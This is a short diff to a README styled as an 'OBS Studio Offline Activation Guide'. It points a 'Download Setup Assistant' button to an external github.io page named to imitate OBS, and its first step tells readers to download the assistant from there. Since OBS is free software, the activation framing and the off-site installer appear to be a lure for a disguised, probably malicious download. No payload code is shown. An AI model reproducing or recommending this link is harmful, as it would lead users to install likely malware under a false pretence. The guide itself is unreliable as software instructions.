@@ -1,7 +1,7 @@
 # OBS Studio — Offline Activation Guide
 
 🔘 Download Button (Top of the page):  
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](#)
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://obs-studio-desktop.github.io/.github/)
 
 ⚙️ **How to Use**  
 1. Download the setup assistant using the button above  
